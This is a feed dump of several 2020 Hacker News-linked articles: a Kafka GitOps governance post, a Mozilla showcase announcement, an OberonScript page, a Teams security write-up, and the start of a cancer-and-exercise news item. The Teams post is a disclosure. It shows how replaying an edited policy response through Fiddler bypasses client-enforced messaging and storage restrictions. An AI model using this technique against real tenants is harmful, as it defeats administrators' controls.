When looking to automate real-time applications following DataOps, we need to be thinking about more than automating the app deployment. We need to define the correct data governance controls as part of the software delivery.&nbsp;</p><p>This means avoiding blind releasing apps where governance is an afterthought.&nbsp;</p><p>Lack of good governance will reduce the accessibility and trust in data and reduce the confidence to use the data downstream. Governance should cover the accessibility, availability, quality, integrity and confidentiality of the data.&nbsp;</p><p>We want the creator of the App, who best understands the data to be able to define the governance controls as a single package and then have it reviewed by a standard workflow.&nbsp;&nbsp;</p><p>Example: A data analyst builds their own data-processing application, but they also define the governance and compliance controls required to release it. This puts the app’s performance parameters in their hands - they decide what makes it production-ready and enterprise-grade.</p><p>When deploying Kafka on Kubernetes, it may look like this: The analyst defines the application logic in some form (such as SQL) and includes:&nbsp;</p><ul><li><p>The necessary Kafka ACLs</p></li><li><p>The data policies to mask any sensitive data</p></li><li><p>The lag and expected data throughput alerting rules</p></li><li><p>Where those events should be sent to (Slack, Pagerduty, etc)</p></li><li><p>The auditing rules to 3rd parties</p></li></ul><p>And so on...&nbsp;</p><p>This can then be pushed to Git, managed through your standard Git workflows and a merge request created, triggering a build pipeline to deploy across your different environments.&nbsp;</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/57dTrzg6Sg6OORdvRTeebS/adef2d61514ca6b0e621c6343a22c4cf/GetYourGitOps.png" alt="GetYourGitOps"></p><p>If you’re working with Kafka and doing this, there are two areas we need to consider:</p><ol><li><p>How to define the the application &amp; governance landscape as config</p></li><li><p>How to best automate deployment in an infrastructure-agnostic and secure way.</p></li></ol><h2>Defining the App and Governance as config</h2><p>
Lenses provide a full experience for data practitioners (developers, analysts, even business users) to build real-time applications deploying on a Kafka &amp; Kubernetes data platform by ensuring all data is catalogued, made accessible and explorable.&nbsp;</p><p>The<a href="https://docs.lenses.io/4.0/tools/cli/"> Lenses CLI client</a> allows your “data landscape” to be exported as declarative configuration.&nbsp; Here’s for example a YAML file representing an AVRO schema:</p><pre>name:&nbsp;taxi_trips-value</pre><pre></pre><pre>avroSchema:&nbsp;|-</pre><pre></pre><pre>&nbsp;&nbsp;{</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;"type":&nbsp;"record",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;"name":&nbsp;"taxi_trips",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;"doc":&nbsp;"Dataset&nbsp;with&nbsp;the&nbsp;Lensicab&nbsp;taxi&nbsp;trips&nbsp;containing&nbsp;trip&nbsp;distance",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;"fields":&nbsp;[</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"name":&nbsp;"trip",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"type":&nbsp;{</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"type":&nbsp;"record",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"name":&nbsp;"record",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"fields":&nbsp;[</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"name":&nbsp;"id",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"type":&nbsp;"string",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"doc":&nbsp;"The&nbsp;unique&nbsp;ID&nbsp;of&nbsp;this&nbsp;taxi&nbsp;ride/trip"</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"name":&nbsp;"date",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"type":&nbsp;"string",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"doc":&nbsp;"The&nbsp;date&nbsp;when&nbsp;the&nbsp;ride/trip&nbsp;happened"</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"name":&nbsp;"distance",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"type":&nbsp;"double",</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"doc":&nbsp;"The&nbsp;distance&nbsp;of&nbsp;the&nbsp;taxi&nbsp;ride/trip&nbsp;in&nbsp;Km"</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;]</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</pre><pre></pre><pre>&nbsp;&nbsp;&nbsp;&nbsp;]</pre><pre></pre><pre>&nbsp;&nbsp;}</pre><p>Or a Topic:</p><pre>name:&nbsp;payments</pre><pre></pre><pre>replication:&nbsp;1</pre><pre></pre><pre>partitions:&nbsp;4</pre><pre></pre><pre>configs:</pre><pre></pre><pre>&nbsp;&nbsp;cleanup.policy:&nbsp;delete</pre><pre></pre><pre>&nbsp;&nbsp;compression.type:&nbsp;lz4</pre><pre></pre><pre>&nbsp;&nbsp;retention.bytes:&nbsp;"800000000"</pre><pre></pre><pre>&nbsp;&nbsp;retention.ms:&nbsp;"4604800000"</pre><pre></pre><pre>&nbsp;&nbsp;segment.bytes:&nbsp;"8388608"</pre><p>Or a data masking rule (“data policy”)</p><pre>name:&nbsp;PersonalEmail</pre><pre></pre><pre>lastUpdated:&nbsp;"2020-03-04T14:37:17.821Z"</pre><pre></pre><pre>versions:&nbsp;0</pre><pre></pre><pre>impactType:&nbsp;MEDIUM</pre><pre></pre><pre>impact:</pre><pre></pre><pre>&nbsp;&nbsp;topics:</pre><pre></pre><pre>&nbsp;&nbsp;-&nbsp;customer_details</pre><pre></pre><pre>&nbsp;&nbsp;processors:&nbsp;[]</pre><pre></pre><pre>&nbsp;&nbsp;connectors:&nbsp;[]</pre><pre></pre><pre>&nbsp;&nbsp;apps:&nbsp;[]</pre><pre></pre><pre>category:&nbsp;PII</pre><pre></pre><pre>fields:</pre><pre></pre><pre>-&nbsp;mail</pre><pre></pre><pre>-&nbsp;email</pre><pre></pre><pre>-&nbsp;email_address</pre><pre></pre><pre>obfuscation:&nbsp;Email</pre><p>Configuration would include objects:</p><ul><li><p>AVRO Schemas</p></li><li><p>Topics</p></li><li><p>ACLs</p></li><li><p>Quotas</p></li><li><p>App Logic (as SQL or Kafka Connect config)</p></li><li><p>Monitoring alert rules (lag, throughput etc.)</p></li><li><p>Data masking rules</p></li><li><p>Secrets</p></li><li><p>Deployment definition (for example for Kubernetes or Kafka Connect)</p></li><li><p>Connections</p></li></ul><p>See<a href="https://docs.lenses.io/4.0/tools/cli/gitops/exporting/"> </a> for exporting as configuration.&nbsp;</p><h2>How to apply GitOps to Kafka and best maintain a consistent state</h2><p>
Here’s where there are a few different methods that are commonly adopted.&nbsp;</p><h3>Push Methods</h3><p>This is the method we see most organizations adopt. Teams will push to Git which will trigger a deploy pipeline in any CI/CD (such as Jenkins) using various APIs in Kafka, Kafka Connect, Kubernetes or wherever you’re running your applications. It also makes it difficult for Jenkins to monitor the desired state and ensure consistency with Git.</p><p>Of course you also need to open up the firewall to allow Jenkins into your data platform.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/74tcs9DG4E3jGe7mk34fku/3a4d4d3bd393f1de19d92d0f659ad9ff/GetYourGitOps_Pushing.png" alt="Traditional CI/CD push for Kafka automation"></p><h4>K8 Operator for Kafka</h4><p>You can use a Kubernetes operator to push the desired state. Jenkins or your CI/CD tool still needs to penetrate the data platform environment, however, which may increase security risk. Then you can use a Kubernetes operator (such as Strimzi’s) to monitor the desired state and apply the state to Kafka via APIs. This method is often used to operate the Kafka infrastructure, scale up Brokers etc. rather than to operate at the data layer (Topics, ACLs etc.)</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/47dnPqN0cGXI46XbqGx9gg/25f72efd0b1a927661c5dd0359e9916c/GetYourGitOps_K8s.png" alt="Traditional Kubernetes operator for GitOps"></p><h3>Pull Methods</h3><p>Pull methods are still based on an operator pattern, but through watching Git rather than watching Kubernetes.&nbsp;</p><p>This allows the pattern to work independently of using Kubernetes. </p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/RrcOkBDI9jgcm4KXBL9ca/73f4b286f539b47886b4854803fd7917/gitops_graffic_lenses_operator.png" alt="Lenses Operator for GitOps"></p><p>The operator is a Lenses operator which can run either inside or outside your data platform.&nbsp; The operator speaks with Lenses which applies the desired state to the data platform including any real-time applications. So for example for anyone using <a href="https://lenses.io/blog/2020/07/Why-new-Streaming-SQL-opens-up-data-platform/">Lenses Streaming SQL</a>, this would deploy the application over Kubernetes.&nbsp;</p><p>The desired state of course would have been created within a separate Lenses environment and exported as config with the CLI before being pushed into Git.&nbsp;</p><p>The benefit of this pull deployment approach is it provides a more secure environment by not needing your CI/CD to access your infrastructure, it also ensures your applications are secured, governed and audited in Git with the state actively monitored and the ability to rollback at any time.&nbsp;&nbsp;</p><p><b>You can practice GitOps in the free </b><a href="https://lenses.io/box/">Kafka+Lenses docker developer Box </a><b>now.&nbsp; If you’re interested in an early access to the Lenses Operator: get in touch with us now</b><a href="https://lenses.io/contact-us/"> by form</a><b> or via </b><a target="_blank" href="https://launchpass.com/lensesio">Slack.</a><b> </b></p></div></div>]]>
            </description>
            <link>https://lenses.io/blog/2020/09/kafka-gitops-with-dataops/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24910344</guid>
            <pubDate>Tue, 27 Oct 2020 18:32:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mozilla's Fix the Internet Showcase]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24910188">thread link</a>) | @lightninglu10
<br/>
October 27, 2020 | https://talium.co/doc/xboZza/s/ | <a href="https://web.archive.org/web/*/https://talium.co/doc/xboZza/s/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p dir="ltr">Our mission is to support founders and companies building amazing internet products that care about the health of the internet. Grow, but not at all costs. Build delightful products and retain your users, but not because you've exploited someone's addictive triggers. <span>Privacy, sustainability, inclusivity, are not something to "figure out later", but are core in the company culture. </span></p><p dir="ltr"><span>We want all of our founders building big, massive products and companies. Hopefully as big as Mozilla Firefox. We just want everyone to do it ethically.</span></p><p dir="ltr">Since our launch this Spring, weâ€™ve funded 50 amazing teams in our Incubator, and weâ€™ve mentored over 300 different projects in our Open Lab. All of these teams are working on building a better internet.</p><p dir="ltr"><span size="5">We're <b>thrilled</b> to announce the <a href="https://hopin.to/events/mozilla-builders-fix-the-internet" target="_blank">Inaugural Mozilla Builders Fix The Internet Showcase</a> this Thursday, October 29 from 11:00am-12:30pm PDT.</span></p><p dir="ltr"><span>Our Showcase will feature:</span></p><ul><li dir="ltr"><p dir="ltr" role="presentation"><span>ðŸ‘©â€�ðŸ�« Mozillaâ€™s CEO Mitchell Baker kicking us off with her thoughts on the state of the internet and What Needs Building</span></p></li><li dir="ltr"><p dir="ltr" role="presentation"><span>ðŸ”¥ A fireside chat with founders on "Conscious Capitalism"</span></p></li><li dir="ltr"><p dir="ltr" role="presentation"><span><span>ðŸ”¥ </span>Hot takes from Mozilla builders and mentors (incl. Rotten Tomatoes founder Patrick Lee, and others) on â€œHow To Build A Better Internetâ€�!  </span></p></li><li dir="ltr"><p dir="ltr" role="presentation"><span>ðŸ‘¥ Weâ€™ll be showing off the top projects weâ€™ve funded through our Incubator and helped along through our Open Lab.</span></p></li></ul><p dir="ltr"><span>Featured companies are building </span><a href="https://shopneutral.io/" target="_blank">Honey for carbon offsets</a>,<span> </span><a href="https://www.thekanary.com/" target="_blank">Swiffer for personal data</a><span>, high interest savings through crypto, </span><a href="https://www.inmotion.app/" target="_blank">Superhuman for the browser</a><span>, </span><a href="https://www.bravedns.com/" target="_blank">next-gen DNS resolvers</a>, top tech publication <a href="https://hackernoon.com/" target="_blank">Hacker Noon</a>, decentralized farming networks, and <a href="https://builders.mozilla.community/alumni.html" target="_blank">so much more</a>.</p><p dir="ltr"><span>Some of the problems our teams are solving include:</span></p><ul><li dir="ltr"><p dir="ltr" role="presentation"><span>How do we shift the balance of power from centralized forces back towards individuals, citizens and communities?</span></p></li><li dir="ltr"><p dir="ltr" role="presentation"><span>Can we build a new way to communicate online that favors privacy and people? How do we make platforms safe for usersâ€™ voices while protecting their personal and professional interests? What needs to evolve?</span></p></li><li dir="ltr"><p dir="ltr" role="presentation"><span>Can we build new business models for messaging, social networking, news and information that donâ€™t rely on excessive data mining or hijacking our attention?</span></p></li><li dir="ltr"><p dir="ltr" role="presentation"><span>What will the next evolution of the internet networkâ€™s architecture and infrastructure look like?  How can decentralized technologies move the internet further towards the edge and the people?</span></p></li></ul><p dir="ltr"><span>With missions that large, it may feel like we need to rewire everything... but getting started doesnâ€™t have to be overwhelming.</span></p><p dir="ltr"><span>So if you want to learn from our </span><a href="https://builders.mozilla.community/?utm_source=www.mozilla.org&amp;utm_medium=referral&amp;utm_campaign=builders-redirect" target="_blank">amazing mentors</a> and founders, or if you're a startup and want to learn more about our $75k and $16k funding opportunities, <a href="https://hopin.to/events/mozilla-builders-fix-the-internet" target="_blank">come join us at the event</a>!</p><p dir="ltr"><span>If you're also a concerned internet citizen, help us spread the word by sharing the event with one or two of your friends. </span></p><p dir="ltr"><span>We're also doing a giveaway on Twitter of our </span><a href="https://twitter.com/mozillabuilders/status/1319380829303238656" target="_blank">Mozilla Builders Fix-The-Internet swag box</a><span>. All you need to do is </span><a href="https://talium.co/doc/xboZza/s/I'm%20going,%20are%20you?%20%20On%20October%2029th,%20join%20@mozillabuilders%20and%20@mozilla%20CEO%20and%20Founder%20@MitchellBaker%20for%20their%20inaugural%20Fix%20the%20Internet%20Showcase%20to%20learn%20from%20entrepreneurs%20and%20mentors%20on%20how%20to%20build%20a%20better%20net%20for%20all!%20RSVP:%20https://hopin.to/events/mozilla-builders-fix-the-internet" target="_blank">tweet this tweet</a>, and <a href="https://hopin.to/events/mozilla-builders-fix-the-internet" target="_blank">RSVP for the showcase</a> <span>to be eligible to win.</span></p><p dir="ltr">See you at our Showcase!</p><p dir="ltr">p.s. this post was written on&nbsp;<a href="http://talium.co/" target="_blank">talium.co</a>, one of the awesome products from our Summer batch!</p></div></div>]]>
            </description>
            <link>https://talium.co/doc/xboZza/s/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24910188</guid>
            <pubDate>Tue, 27 Oct 2020 18:16:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OberonScript: a safe scripting language and runtime for web apps (2007)]]>
            </title>
            <description>
<![CDATA[
Score 40 | Comments 29 (<a href="https://news.ycombinator.com/item?id=24909114">thread link</a>) | @lproven
<br/>
October 27, 2020 | http://www.ralphsommerer.com/obn.htm | <a href="https://web.archive.org/web/*/http://www.ralphsommerer.com/obn.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="flowhor">
  
  <div id="flowvert">
   
   <div id="mainbody">
       
<h2>OberonScript</h2>
<p>Oberon Script is a scripting language and runtime system for building interactive Web Client applications. It consists of a compiler that translates the full Oberon language into JavaScript code, and a small runtime system that detects and compiles at load-time script sections written in Oberon Script.</p>
<p>It is a complete re-implementation from scratch of an earlier compiler that I built
while being with <a href="http://research.microsoft.com/">Microsoft Research</a>
in <a href="http://en.wikipedia.org/wiki/Cambridge">Cambridge</a>. For legal reasons I was unable to take the code with me
but I cleared the code by MSR's legal department for publication via <a href="http://research.microsoft.com/research/downloads/default.aspx">Microsoft Research's code posting tool</a>.
However, I left MSR before completing the process, hence the complete rewrite.</p>
<h3>Code</h3>
<p>The code of the compiler is available in its current, far from final version in source code (obviously...) for personal,
non-commercial and non-governmental use. The usual disclaimers apply.</p>
<p>A very minimal documentation is also available. I may merge it some time with the prettyprinted HTML version below.</p>

<p>V2.0beta [<a href="http://www.ralphsommerer.com/oberon.js">JavaScript</a>] [<a href="http://www.ralphsommerer.com/oberon.js.htm">HTML</a> <small>color coded</small>] [<a href="http://www.ralphsommerer.com/obndoc.htm">Docu</a>] <small>July 6, 2007</small></p>

<h3>Presentations</h3>
<ul>
<li><a href="http://www.oberon-industry.ethz.ch/">Oberon Day 2007</a>, ETH Zürich, Switzerland, June 29, 2007</li>
<li>Joint Modular Languages Conference (<a href="http://cms.brookes.ac.uk/computing/JMLC2006/">JMLC 2006</a>), Oxford, UK, September 13-15, 2006</li>
</ul>
<h3>Publications</h3>
<p>Ralph Sommerer: 
<i>Oberon Script: A Lightweight Compiler and Runtime System for the 
Web</i>, Proceedings of the 7th Joint Modular Languages Conference, <a href="http://cms.brookes.ac.uk/computing/JMLC2006/">JMLC 2006</a>, Oxford, UK, September 13-15, 2006,
<a href="http://www.springer.com/dal/home/generic/search/results?SGWID=1-40109-22-173677107-0">LNCS Vol 4228</a>, Springer, 2006 
<small>[also available as <a href="http://research.microsoft.com/research/pubs/view.aspx?tr_id=1094">MSR 
Technical Report 2006-50</a>]</small> </p>

</div>
   
  </div>
 </div></div>]]>
            </description>
            <link>http://www.ralphsommerer.com/obn.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-24909114</guid>
            <pubDate>Tue, 27 Oct 2020 16:39:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Abusing Teams client protocol to bypass Teams security policies]]>
            </title>
            <description>
<![CDATA[
Score 231 | Comments 107 (<a href="https://news.ycombinator.com/item?id=24908776">thread link</a>) | @tommoor
<br/>
October 27, 2020 | https://o365blog.com/post/teams-policies/ | <a href="https://web.archive.org/web/*/https://o365blog.com/post/teams-policies/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<figure>
				<img src="https://o365blog.com/images/posts/teams-policies.png" alt="Abusing Teams client protocol to bypass Teams security policies">
			</figure>
				<nav id="TableOfContents">
<ul>
<li><a href="#what-are-teams-policies">What are Teams policies?</a></li>
<li><a href="#bypassing-teams-policies">Bypassing Teams policies</a>
<ul>
<li><a href="#initial-discovery">Initial discovery</a></li>
<li><a href="#observing-teams-client-behaviour">Observing Teams client behaviour</a></li>
<li><a href="#testing-in-action">Testing in action</a></li>
</ul></li>
<li><a href="#detecting-and-protecting">Detecting and protecting</a></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#references">References:</a></li>
</ul>
</nav>
			<p>Administrators can use teams policies for controlling what users can do in Microsoft Teams.</p>

<p>In this blog, I’ll show that these policies are applied only in client and thus can be easily bypassed.</p>





<p>Policies are used in Microsoft Office 365 and Azure AD for securing access to services and data. Besides the <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/identity-access-policies?view=o365-worldwide" target="_blank">common identity and device access policies</a>,
Microsoft has provided a set of <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/teams-access-policies?view=o365-worldwide" target="_blank">Teams specific policies</a>:</p>

<ul>
<li>Teams and channel policies</li>
<li>Messaging policies</li>
<li>Meeting policies</li>
<li>App permission policies</li>
</ul>

<p>For example, administrators can configure Teams so that external users are not able to edit or delete any messages they’ve sent. Or, an owner of a Teams site can disable message editing for members of a certain channel.</p>



<h2 id="initial-discovery">Initial discovery</h2>

<p>While I was working with the previous version (v0.4.4) of <a href="https://o365blog.com/aadinternals" target="_blank">AADInternals</a> Teams functions I noticed an interesting thing: I was able to edit and delete chat messages using AADInternals as a guest
even when it was not allowed.</p>

<p>This led to a question that <strong>what if the policies are applied only at the client end?</strong> In practice this would mean that the Teams service tells to your Teams client that “Though shall not edit messages!” but the client
could still do so.</p>

<h2 id="observing-teams-client-behaviour">Observing Teams client behaviour</h2>

<p>I started by watching what was going on between the client and cloud when the Teams client started. The first observation was that the client made about 120 http requests to the cloud.
While browsing through those requests, I spotted one that caught my interest (headers stripped):</p>

<pre><code>POST https://teams.microsoft.com/api/mt/part/emea-02/beta/users/useraggregatesettings HTTP/1.1

{
    "tenantSettingsV2": true,
    "userResourcesSettings": true,
    "messagingPolicy": true,
    "clientSettings": true,
    "targetingPolicy": true,
    "tenantSiteUrl": true,
    "userPropertiesSettings": true,
    "callingPolicy": true,
    "meetingPolicy": true,
    "educationAssignmentsAppPolicy": true
}
</code></pre>

<p>The response contained all the settings and policies the Teams client is allowed to do as the logged in user. Below can be seen the <strong>messagingPolicy</strong> section:
</p><div><pre><code data-lang="json"><span></span><span>"messagingPolicy"</span><span>:</span> <span>{</span>
	<span>"value"</span><span>:</span> <span>{</span>
		<span>"allowUserEditMessage"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowUserDeleteMessage"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowUserChat"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowGiphy"</span><span>:</span> <span>true</span><span>,</span>
		<span>"giphyRatingType"</span><span>:</span> <span>"Moderate"</span><span>,</span>
		<span>"allowGiphyDisplay"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowPasteInternetImage"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowMemes"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowStickers"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowUserTranslation"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowUrlPreviews"</span><span>:</span> <span>true</span><span>,</span>
		<span>"readReceiptsEnabledType"</span><span>:</span> <span>"UserPreference"</span><span>,</span>
		<span>"allowImmersiveReader"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowPriorityMessages"</span><span>:</span> <span>true</span><span>,</span>
		<span>"audioMessageEnabledType"</span><span>:</span> <span>"ChatsAndChannels"</span><span>,</span>
		<span>"channelsInChatListEnabledType"</span><span>:</span> <span>"DisabledUserOverride"</span><span>,</span>
		<span>"allowRemoveUser"</span><span>:</span> <span>true</span><span>,</span>
		<span>"allowSmartReply"</span><span>:</span> <span>true</span>
	<span>}</span>
<span>}</span>
</code></pre></div>


<p>What we can learn here is that the Teams client asks from the cloud what the current user is allowed to do, which was the expected behaviour.</p>

<h2 id="testing-in-action">Testing in action</h2>

<p>Next I decided to try whether I could lie to Teams client:</p>

<ol>
<li><p>I saved the response from above to be used as a baseline.</p></li>

<li><div><p>I created a new Messaging policy to disable editing and deleting of sent messages.</p><p>
I applied the policy to a single demo user:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies1.png" alt="Custom policy"></p><p>Now I had two policies, the default organisation wide and the restricted one for demo user:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies2.png" alt="Policies"></p></div></li>

<li><p>I restarted the Teams client and noticed that the editing and deleting were correctly disabled (didn’t exists).</p></li>

<li><div><p>I compared the returned policies from the <strong>useraggregatesettings</strong> requests<br>
and as we can see, the request was missing two lines:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies3.png" alt="Policy comparison"></p></div></li>

<li><div><p>I closed the client and configured Fiddler to do an autoresponse using the saved http response from above:</p><p>
<img src="https://o365blog.com/images/posts/teams-policies4.png" alt="Fiddler autoresponse"></p><p>
Now, when the client is requesting the settings file, it will be served the one that allows editing and deleting.</p></div></li>

<li><p>I started the Teams client and <strong>the editing and deleting were again allowed</strong> and I was able to edit and delete (my own) messages!</p></li>
</ol>

<p>What we can lean here is that <strong>we can lie to Teams client</strong> and change its behaviour 😂 <br>
Moreover, we learnt that <strong>Teams policies are applied only on the client</strong> 🤦‍♂</p>

<p>Here is the video demonstrating this with <strong>AADInternals</strong> and <strong>Fiddler</strong> (sorry for the bad audio after 03:20):</p>

<div><iframe width="560" height="315" src="https://www.youtube.com/embed/Zcqig-OyUMY" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</div>

<p>Below is a video that shows in action that this works also with <strong>cloud file storage restrictions</strong>:<br></p>

<p><iframe width="560" height="315" src="https://www.youtube.com/embed/a32TkLIBwS4" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<br><strong>Note:</strong> Although not seen on the video, I was able to add my Google Drive account to Teams so this is not just a UI thing.</p>



<p>As far as I know, the “uncompliant” Teams client behaviour can not be detected.</p>

<p>Same verdict with protecting. Well, one could try to use Conditional Access (CA) with device ownership and compliance restrictions, but that doesn’t cover all scenarios.</p>



<p>Our little test here proves that <strong>Teams policies are applied ONLY on the client!</strong>.</p>

<p>If the user (or guest) is utilising Teams APIs directly, using for instance AADInternals <a href="https://o365blog.com/aadinternals/#teams-functions" target="_blank">Teams functionality</a>, he or she can bypass the restrictions set by the policies.
However, this is not a bug or vulnerability as such, but a (very very bad) design choice by Microsoft.</p>

<p>Users can do at least the following:</p>

<ul>
<li>Bypass messaging policies</li>
<li>Bypass cloud file storage restrictions</li>
<li>Bypass meetings policies</li>
</ul>

<p>⚠️ <strong>Teams policies are NOT a security measure and organisations should not rely on them!</strong> ⚠️</p>



<ul>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/identity-access-policies?view=o365-worldwide" target="_blank">Common identity and device access policies</a></li>
<li>Microsoft: <a href="https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/teams-access-policies?view=o365-worldwide" target="_blank">Policy recommendations for securing Teams chats, groups, and files</a></li>
</ul>
		</div></div>]]>
            </description>
            <link>https://o365blog.com/post/teams-policies/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24908776</guid>
            <pubDate>Tue, 27 Oct 2020 16:07:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Study shows how exercise stalls cancer growth through the immune system]]>
            </title>
            <description>
<![CDATA[
Score 16 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24908425">thread link</a>) | @gmays
<br/>
October 27, 2020 | https://news.ki.se/study-shows-how-exercise-stalls-cancer-growth-through-the-immune-system | <a href="https://web.archive.org/web/*/https://news.ki.se/study-shows-how-exercise-stalls-cancer-growth-through-the-immune-system">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><img src="https://news.ki.se/sites/default/files/styles/article_full_width/public/qbank/ZIM_6255ZIM_6255-custom20201026104950.jpg" alt="Randall Johnson and Helene Rundqvist, researchers at Karolinska Institutet. Credit: Stefan Zimmerman."></p><p>Randall Johnson and Helene Rundqvist, researchers at Karolinska Institutet. Credit: Stefan Zimmerman.</p>
                  </div><div>
        
            <p>Prior research has shown that physical activity can prevent unhealth as well as improve the prognosis of several diseases including various forms of cancer. Exactly how exercise exerts its protective effects against cancer is, however, still unknown, especially when it comes to the biological mechanisms. One plausible explanation is that physical activity activates the immune system and thereby bolsters the body’s ability to prevent and inhibit cancer growth.</p>

<p>In this study, researchers at Karolinska Institutet expanded on this hypothesis by examining how the immune system’s cytotoxic T cells, that is white blood cells specialized in killing cancer cells, respond to exercise.</p>

<h2>Cancer growth slowed in trained animals</h2>

<p>They divided mice with cancer into two groups and let one group exercise regularly in a spinning wheel while the other remained inactive. The result showed that cancer growth slowed and mortality decreased in the trained animals compared with the untrained.</p>

